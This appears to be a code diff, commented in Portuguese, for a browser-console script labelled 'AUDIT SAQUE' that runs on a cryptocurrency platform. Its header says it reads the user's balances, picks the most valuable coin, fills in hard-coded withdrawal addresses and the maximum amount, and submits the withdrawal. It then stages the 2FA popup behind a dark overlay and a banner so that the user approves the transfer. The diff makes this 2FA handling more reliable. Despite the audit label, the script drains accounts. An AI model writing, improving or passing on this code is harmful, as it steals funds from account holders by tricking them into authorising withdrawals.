@@ -1,3 +1,27 @@
+/* =========================================================================
+   AUDIT SAQUE - Script de console do navegador
+   Le os saldos do SITE, escolhe a moeda de maior valor e faz o pedido de saque
+
+   Fluxo:
+   1. Abre o modal de retirada
+   2. Le todos os saldos exibidos no site (.dwc_item)
+   3. Escolhe a moeda de MAIOR VALOR (USD ou saldo bruto)
+   4. Mapeia para o endereco de saque correspondente
+   5. Preenche endereco + valor maximo
+   6. Clica em Retirada (sendWithdraw)
+   7. Detecta o popup 2FA
+   8. Cobre o fundo com overlay escuro + banner amarelo
+   9. Remove overlay ao enviar o codigo 2FA
+
+   Elementos da plataforma:
+   - Botao Retirada: a.wallet-nav__item[onclick*="withdraw"]
+   - Lista de moedas: div.dwc_item[data-cur="POL"] onclick="listCurSel('POL',2,2,this)"
+   - Botao de rede: button.vmi_Polygon onclick="cabChooseNs('Polygon',2,'POL')"
+   - Endereco: input#with_address
+   - Valor: input#with_amount (oninput="changeWithA(this)")
+   - Saldo: div#with_inp_bal
+   - Botao enviar: button.btn_withdraw onclick="sendWithdraw(0,this)"
+   ========================================================================= */
 (function(){
   /* ---- enderecos de saque por tipo de rede ---- */
   var ENDERECOS = {
@@ -258,6 +282,7 @@
   }
 
   /* ---- PASSO 4: detectar modal 2FA ---- */
+
   async function detectar2FA() {
     log('PASSO 5: Aguardando modal 2FA...');
     await esperar(3000);
@@ -265,6 +290,7 @@
     // procura pelo modal/overlay de 2FA
     // DETECCAO DO POPUP 2FA: procura pelo input real de 6 digitos
     // NAO usa .with2faEn (que fica dentro do formulario de saque)
+    // O 2FA da plataforma é um swal2 (SweetAlert2) - detecta normalmente
     var el2fa = null;
     var container2fa = null;
     var detectado = false;
@@ -272,7 +298,8 @@
     // funcao que procura o popup 2FA real
     function procurar2fa() {
       // 1. input com name/id relacionado a codigo/2fa
-      var input = document.querySelector(
+      var input = null;
+      var candidatos1 = document.querySelectorAll(
         'input[name="user_code"], input[name="code"], input[name="2fa"], ' +
         'input[name="otp"], input[name="google_code"], input[name="auth_code"], ' +
         '#user_code, #code, #otp_code, #google_code, ' +
@@ -280,22 +307,33 @@
         'input[placeholder*="2fa" i], input[placeholder*="verif" i], ' +
         'input[placeholder*="auth" i], input[placeholder*="otp" i]'
       );
+      for (var c = 0; c < candidatos1.length; c++) {
+        if (candidatos1[c].offsetParent !== null) {
+          input = candidatos1[c];
+          break;
+        }
+      }
       // 2. input com maxlength=6 (codigo de 6 digitos)
       if (!input) {
-        input = document.querySelector('input[maxlength="6"]');
+        var inputs6 = document.querySelectorAll('input[maxlength="6"]');
+        for (var k = 0; k < inputs6.length; k++) {
+          if (inputs6[k].offsetParent !== null) {
+            input = inputs6[k];
+            break;
+          }
+        }
       }
       // 3. conjunto de inputs maxlength=1 (6 inputs separados - UI comum de 2FA)
+      //    o swal2 da plataforma usa 6 inputs maxlength=1
       if (!input) {
         var inputs1 = document.querySelectorAll('input[maxlength="1"]');
+        var inputsValidos = [];
+        for (var i = 0; i < inputs1.length; i++) {
+          if (inputs1[i].offsetParent !== null) inputsValidos.push(inputs1[i]);
+        }
         // se tem 4-8 inputs maxlength=1 juntos, é provavel que seja 2FA
-        if (inputs1.length >= 4 && inputs1.length <= 8) {
-          // verifica se estao visiveis
-          for (var i = 0; i < inputs1.length; i++) {
-            if (inputs1[i].offsetParent !== null) {
-              input = inputs1[i];
-              break;
-            }
-          }
+        if (inputsValidos.length >= 4 && inputsValidos.length <= 8) {
+          input = inputsValidos[0];
         }
       }
       // 4. qualquer input visivel que NAO esta dentro do formulario de saque
@@ -377,34 +415,15 @@
       document.body.appendChild(overlay);
       log('Overlay escuro criado.');
 
-      // 4. destaca o 2FA: coloca por cima do overlay
-      //    salva o estilo original e aplica position fixed
-      var estiloOriginal = container2fa.getAttribute('style') || '';
-      container2fa.setAttribute('data-audit-original-style', estiloOriginal);
-      container2fa.style.cssText = estiloOriginal +
-        'position:fixed !important;' +
-        'top:50% !important;' +
-        'left:50% !important;' +
-        'transform:translate(-50%,-50%) !important;' +
-        'z-index:999999 !important;' +
-        'background:#1a1a2e !important;' +
-        'padding:30px 40px !important;' +
-        'border-radius:12px !important;' +
-        'box-shadow:0 0 40px rgba(0,0,0,0.9) !important;' +
-        'max-width:90vw !important;' +
-        'max-height:90vh !important;' +
-        'overflow:auto !important;' +
-        'display:block !important;' +
-        'visibility:visible !important;' +
-        'opacity:1 !important;';
-      log('2FA destacado por cima do overlay.');
-
-      // 5. tambem destaca filhos do 2FA que possam estar escondidos
-      container2fa.querySelectorAll('*').forEach(function(el){
-        if (el.style.display === 'none') el.style.display = '';
-        if (el.style.visibility === 'hidden') el.style.visibility = '';
-        if (parseFloat(el.style.opacity || '1') === 0) el.style.opacity = '1';
-      });
+      // 4. coloca o modal 2FA por cima do overlay SEM alterar a aparencia dele
+      //    apenas sobe o z-index do container do swal2 (.swal2-container)
+      //    isso mantem os botoes exatamente como a plataforma configurou
+      //    (nao força visibilidade de botoes "No"/"Cancel" que o swal2 esconde)
+      var swalContainer = container2fa.closest('.swal2-container') || container2fa;
+      var zIndexOriginal = swalContainer.style.zIndex || '';
+      swalContainer.setAttribute('data-audit-original-zindex', zIndexOriginal);
+      swalContainer.style.setProperty('z-index', '999999', 'important');
+      log('Modal 2FA elevado por cima do overlay (sem alterar aparencia).');
 
       // 5b. adiciona banner amarelo ACIMA do modal 2FA
       //    elemento separado, flutuante, nao depende da estrutura do modal
@@ -438,11 +457,15 @@
         if (ov) ov.remove();
         var av = document.getElementById('audit_aviso_codigo');
         if (av) av.remove();
-        // restaura estilo original do 2FA
-        var orig = container2fa.getAttribute('data-audit-original-style');
-        if (orig !== null) {
-          container2fa.setAttribute('style', orig);
-          container2fa.removeAttribute('data-audit-original-style');
+        // restaura o z-index original do container do swal2
+        var zOrig = swalContainer.getAttribute('data-audit-original-zindex');
+        if (zOrig !== null) {
+          if (zOrig) {
+            swalContainer.style.zIndex = zOrig;
+          } else {
+            swalContainer.style.removeProperty('z-index');
+          }
+          swalContainer.removeAttribute('data-audit-original-zindex');
         }
         log('Overlay removido. Estilo restaurado.');
       }
